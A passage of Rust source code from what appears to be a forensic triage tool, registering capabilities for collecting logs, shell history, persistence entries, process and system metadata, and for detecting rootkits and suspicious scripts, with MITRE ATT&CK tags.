                capability_id: "artifact.auth.logs",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_logs",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_auth_logs",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.journal",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_logs",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_journal",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.auditd",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_logs",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_auditd",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.sudo",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_logs",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_sudo",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.bash.history",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_shell_history",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_bash_history",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.zsh.history",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_shell_history",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_zsh_history",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.login.config",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_logs",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_login_config",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.container",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_container_artifacts",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_container",
            },
            // Kernel/Driver capabilities
            RuntimeCapabilityBinding {
                capability_id: "kernel.modules",
                runtime_module: "jockey_runtime_registry",
                runtime_handler: "enumerate_modules",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "kernel_modules",
            },
            RuntimeCapabilityBinding {
                capability_id: "kernel.syscalls",
                runtime_module: "jockey_runtime_registry",
                runtime_handler: "inspect_syscall_table",
                abi_symbol: None,
                platform: Platform::Linux,
                privilege: PrivilegeLevel::Kernel,
                evidence_contract: "kernel_syscalls",
            },
            RuntimeCapabilityBinding {
                capability_id: "kernel.boot_config",
                runtime_module: "jockey_runtime_registry",
                runtime_handler: "collect_boot_config",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "kernel_boot_config",
            },
            // Security capabilities
            RuntimeCapabilityBinding {
                capability_id: "security.audit_policy",
                runtime_module: "jockey_runtime_security",
                runtime_handler: "collect_audit_policy",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "audit_policy",
            },
            RuntimeCapabilityBinding {
                capability_id: "security.av_status",
                runtime_module: "jockey_runtime_security",
                runtime_handler: "detect_av_edr",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "av_edr_status",
            },
            RuntimeCapabilityBinding {
                capability_id: "security.app_control",
                runtime_module: "jockey_runtime_security",
                runtime_handler: "collect_app_control",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "app_control",
            },
            RuntimeCapabilityBinding {
                capability_id: "security.firewall",
                runtime_module: "jockey_runtime_security",
                runtime_handler: "collect_firewall_rules",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "firewall_rules",
            },
            // Application Artifact capabilities
            RuntimeCapabilityBinding {
                capability_id: "app.browser",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_browser_artifacts",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "app_browser",
            },
            RuntimeCapabilityBinding {
                capability_id: "app.email",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_email_artifacts",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "app_email",
            },
            RuntimeCapabilityBinding {
                capability_id: "app.office",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_office_artifacts",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "app_office",
            },
            // Backdoor/Rootkit capabilities
            RuntimeCapabilityBinding {
                capability_id: "backdoor.rootkit_indicators",
                runtime_module: "jockey_runtime_security",
                runtime_handler: "detect_rootkit_indicators",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::Kernel,
                evidence_contract: "backdoor_rootkit",
            },
            RuntimeCapabilityBinding {
                capability_id: "backdoor.binary_anomalies",
                runtime_module: "jockey_runtime_security",
                runtime_handler: "detect_binary_anomalies",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "backdoor_binary_anomalies",
            },
            // Malicious Script capabilities
            RuntimeCapabilityBinding {
                capability_id: "script.powershell",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_powershell_scripts",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_powershell",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.wmi",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_wmi_scripts",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_wmi",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.shell",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_shell_scripts",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_shell",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.python",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_python_scripts",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_python",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.powershell.metadata",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_powershell_scripts",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_powershell_metadata",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.bash.metadata",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_shell_scripts",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_bash_metadata",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.python.metadata",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_python_scripts",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_python_metadata",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.javascript.metadata",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_javascript_scripts",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_javascript_metadata",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.cmd.metadata",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_batch_scripts",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_cmd_metadata",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.url.indicators",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_all_scripts",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_url_indicators",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.ip.indicators",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_all_scripts",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_ip_indicators",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.file.indicators",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_all_scripts",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_file_indicators",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.environment.indicators",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_all_scripts",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_environment_indicators",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.obfuscation",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_all_scripts",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_obfuscation_indicators",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.execution",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_all_scripts",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_execution_indicators",
            },
            RuntimeCapabilityBinding {
                capability_id: "script.persistence",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_all_scripts",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "script_persistence_indicators",
            },
            // File/Binary Metadata capabilities
            RuntimeCapabilityBinding {
                capability_id: "file.pe_metadata",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "parse_pe_metadata",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "file_pe_metadata",
            },
            RuntimeCapabilityBinding {
                capability_id: "file.pe.metadata",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "parse_pe_metadata",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "file_pe_metadata",
            },
            RuntimeCapabilityBinding {
                capability_id: "file.elf_metadata",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "parse_elf_metadata",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "file_elf_metadata",
            },
            RuntimeCapabilityBinding {
                capability_id: "file.elf.metadata",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "parse_elf_metadata",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "file_elf_metadata",
            },
            RuntimeCapabilityBinding {
                capability_id: "file.hash.sha256",
                runtime_module: "jockey_runtime_filesystem",
                runtime_handler: "hash_sha256",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "file_sha256",
            },
            RuntimeCapabilityBinding {
                capability_id: "file.code_signature",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "verify_code_signature",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "file_code_signature",
            },
            RuntimeCapabilityBinding {
                capability_id: "file.signature",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "verify_code_signature",
                abi_symbol: Some("jockey_rt_invoke_capability"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "file_code_signature",
            },
            RuntimeCapabilityBinding {
                capability_id: "file.entropy",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "analyze_file_entropy",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "file_entropy",
            },
            // Evidence Integrity capabilities
            RuntimeCapabilityBinding {
                capability_id: "evidence.sha256",
                runtime_module: "jockey_runtime_evidence",
                runtime_handler: "hash_sha256",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "evidence_hash",
            },
            RuntimeCapabilityBinding {
                capability_id: "evidence.merkle",
                runtime_module: "jockey_runtime_evidence",
                runtime_handler: "build_merkle_tree",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "merkle_tree",
            },
            RuntimeCapabilityBinding {
                capability_id: "evidence.blockchain_anchor",
                runtime_module: "jockey_runtime_evidence",
                runtime_handler: "anchor_to_blockchain",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "evidence_blockchain_anchor",
            },
            RuntimeCapabilityBinding {
                capability_id: "evidence.chain_of_custody",
                runtime_module: "jockey_runtime_evidence",
                runtime_handler: "generate_chain_of_custody",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "evidence_chain_of_custody",
            },
            // Persistence capabilities
            RuntimeCapabilityBinding {
                capability_id: "persistence.autostart",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_autostart_entries",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "autostart_entries",
            },
            RuntimeCapabilityBinding {
                capability_id: "persistence.scheduled_tasks",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "enumerate_scheduled_tasks",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "persistence_scheduled_tasks",
            },
            RuntimeCapabilityBinding {
                capability_id: "persistence.wmi",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "enumerate_wmi_subscriptions",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "persistence_wmi",
            },
            RuntimeCapabilityBinding {
                capability_id: "persistence.run",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_autostart_entries",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "persistence_run",
            },
            RuntimeCapabilityBinding {
                capability_id: "persistence.startup.folder",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_autostart_entries",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "persistence_startup_folder",
            },
            RuntimeCapabilityBinding {
                capability_id: "persistence.cron",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_autostart_entries",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "persistence_cron",
            },
            RuntimeCapabilityBinding {
                capability_id: "persistence.systemd.timer",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_autostart_entries",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "persistence_systemd_timer",
            },
            RuntimeCapabilityBinding {
                capability_id: "persistence.shell.profile",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_autostart_entries",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "persistence_shell_profile",
            },
            RuntimeCapabilityBinding {
                capability_id: "persistence.ssh",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_autostart_entries",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "persistence_ssh",
            },
            RuntimeCapabilityBinding {
                capability_id: "persistence.winlogon",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_autostart_entries",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "persistence_winlogon",
            },
            RuntimeCapabilityBinding {
                capability_id: "persistence.ifeo",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_autostart_entries",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "persistence_ifeo",
            },
            RuntimeCapabilityBinding {
                capability_id: "persistence.appinit",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_autostart_entries",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "persistence_appinit",
            },
        ];

        for binding in bindings {
            self.runtime_dispatch
                .insert(binding.capability_id.to_string(), binding);
        }
    }

    fn register_named_capabilities(&mut self, entries: &[Capability]) {
        for entry in entries {
            self.register(entry.clone());
        }
    }

    fn register_system_capabilities(&mut self) {
        let entries = [
            Capability::new(
                "system.hostname",
                "Hostname",
                "Collect the current system hostname for host correlation and triage.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.os.name",
                "OS Name",
                "Enumerate the operating system name and release metadata.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.os.version",
                "OS Version",
                "Enumerate the OS version and build metadata.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.kernel.version",
                "Kernel Version",
                "Collect kernel version and release information.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.architecture",
                "Architecture",
                "Collect processor architecture metadata and word-size details.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.cpu.count",
                "CPU Count",
                "Read the total logical CPU count and parallelism metadata.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.cpu.model",
                "CPU Model",
                "Collect detailed CPU model information.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.cpu.cores",
                "CPU Cores",
                "Collect logical CPU core and thread counts.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.cpu.frequency",
                "CPU Frequency",
                "Collect CPU clock frequency metadata when available.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.memory.total",
                "Total Memory",
                "Measure total physical memory in bytes.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.memory.boot",
                "Boot Memory",
                "Collect memory and system resource information for triage.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.boot.time",
                "Boot Time",
                "Collect the system boot timestamp for timeline reconstruction.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.uptime",
                "Uptime",
                "Capture system uptime in seconds.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.timezone",
                "Timezone",
                "Collect timezone and locale information for host context.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.locale",
                "Locale",
                "Capture configured locale and environment defaults.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.machine.id",
                "Machine ID",
                "Collect machine or host identifiers when available.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.virtualization",
                "Virtualization",
                "Detect whether the system is virtualized or running in a container.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.firmware.vendor",
                "Firmware Vendor",
                "Collect firmware vendor and version metadata when available.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.firmware.version",
                "Firmware Version",
                "Read firmware version metadata for forensic context.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.secure.boot",
                "Secure Boot",
                "Collect Secure Boot status when exposed by the platform.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.disks",
                "Disk Inventory",
                "Enumerate disks and drive metadata.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.partitions",
                "Partition Inventory",
                "Enumerate mounted partitions and filesystem layout.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.network.interfaces",
                "Network Interfaces",
                "Enumerate active interfaces and associated addressing metadata.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.software.inventory",
                "Software Inventory",
                "List installed software and package metadata from the OS package manager.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.packages",
                "Package Inventory",
                "Collect installed package metadata across supported package managers.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.users",
                "System Users",
                "Collect local user inventory and account metadata.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1087"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.groups",
                "System Groups",
                "Collect local group inventory and group membership metadata.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1087"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.environment",
                "Environment Variables",
                "Capture environment variable values for host investigation context.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.paths",
                "System Paths",
                "Capture canonical system path configuration.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1082"],
                "collect_system_info",
                true,
            ),
            Capability::new(
                "system.mounts",
                "Mount Inventory",
                "Enumerate mount points and filesystem type metadata.",
                CapabilityCategory::SystemInfo,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1083"],
                "collect_system_info",
                true,
            ),
        ];
        self.register_named_capabilities(&entries);
    }

    fn register_process_capabilities(&mut self) {
        let entries = [
            Capability::new(
                "process.pid",
                "Process ID",
                "Collect the process identifier for each running process.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.ppid",
                "Parent PID",
                "Collect parent process identifiers to construct ancestry.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.name",
                "Process Name",
                "Collect the executable name for each process.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.command_line",
                "Command Line",
                "Collect full command lines for process inspection.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.executable_path",
                "Executable Path",
                "Capture the resolved executable path for each process.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.cwd",
                "Working Directory",
                "Collect the process working directory when permitted.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.start_time",
                "Start Time",
                "Collect process creation time for timeline correlation.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.user",
                "Process User",
                "Collect the owning user for each process.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.group",
                "Process Group",
                "Collect primary group metadata for processes.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.state",
                "Process State",
                "Collect the process life-cycle state.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.memory.rss",
                "RSS Memory",
                "Capture resident set size to identify heavy or suspicious processes.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.memory.vms",
                "Virtual Memory",
                "Capture virtual memory usage for process triage.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.threads",
                "Thread Count",
                "Collect the process thread count.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.handles",
                "Handle Count",
                "Collect open handle counts where available.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.session",
                "Session ID",
                "Collect the session identifier for system and user sessions.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.terminal",
                "Terminal",
                "Collect terminal and tty metadata when available.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.priority",
                "Priority",
                "Collect scheduler priority metadata.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.nice",
                "Nice Value",
                "Collect the nice value and scheduling context.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.env",
                "Environment",
                "Capture the process environment block where permitted.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.cgroup",
                "CGroup",
                "Capture cgroup and container metadata.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.container",
                "Container ID",
                "Demonstrate container membership when present.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.module.list",
                "Loaded Modules",
                "Enumerate DLL or shared library modules loaded by a process.",
                CapabilityCategory::Process,
